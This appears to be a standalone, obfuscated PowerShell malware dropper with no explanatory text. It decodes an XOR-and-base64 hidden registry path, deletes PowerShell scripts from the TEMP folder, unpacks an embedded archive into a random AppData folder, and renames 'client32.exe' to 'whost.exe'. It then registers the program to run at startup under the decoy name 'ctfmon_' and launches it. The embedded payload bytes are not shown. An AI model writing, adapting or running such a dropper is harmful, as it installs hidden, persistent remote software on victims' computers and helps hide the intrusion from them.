


function oghygb4  {
    param($7yfztr2hc, $method)
    $saguhga = [System.Text.Encoding]::ascii.GetBytes("nbuegg")

    if ($method -eq "z47gha"){
        $7yfztr2hc = [System.Text.Encoding]::ascii.GetString([System.Convert]::FromBase64String($7yfztr2hc))
    }

    $upk7fg4rl = [System.Text.Encoding]::ascii.GetBytes($7yfztr2hc)
    $irugha4 = $(for ($6yvkhz17j = 0; $6yvkhz17j -lt $upk7fg4rl.length; ) {
        for ($1jhc9mzf7 = 0; $1jhc9mzf7 -lt $saguhga.length; $1jhc9mzf7++) {
            $upk7fg4rl[$6yvkhz17j] -bxor $saguhga[$1jhc9mzf7]
            $6yvkhz17j++
            if ($6yvkhz17j -ge $upk7fg4rl.Length) {
                $1jhc9mzf7 = $saguhga.length
            }
        }
    })


       $irugha4 = [System.Text.Encoding]::ascii.GetString($irugha4)
    
    
    return $irugha4
}


function Install
{








    

$randf=( -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count 8  | % {[char]$_}) )

$fpath ="$env:appdata\$randf"
mkdir $fpath	

$clientname='whost'+'.exe'
remove-item $env:TEMP\*.ps1

$lit="$fpath\$randf"+".zip"

write-host $hi16yox8a.Length.ToString()
Set-Content -Path "$lit" -Value $hi16yox8a -Encoding Byte
  

 cd $fpath
 add-Type -assembly "System.IO.Compression.Filesystem";
[IO.Compression.Zipfile]::ExtractToDirectory("$lit", "$fpath");
 #expand-archive "$lit" "./"
 remove-item "$lit"
 rename-item "client32.exe" "$clientname"

$reg = oghygb4 "Jik2MF07PQ0TERAGHAcpKA4EHA0GCgETMjUcCwMIGREpJhIVHAcbETECHBEcCgk7PBcb" "z47gha"
new-ItemProperty -Path "$reg" -Name "ctfmon_" -Value "$fpath\$clientname"

start-process "$fpath\$clientname"

}
write-host "before"
install;
write-host "runned"


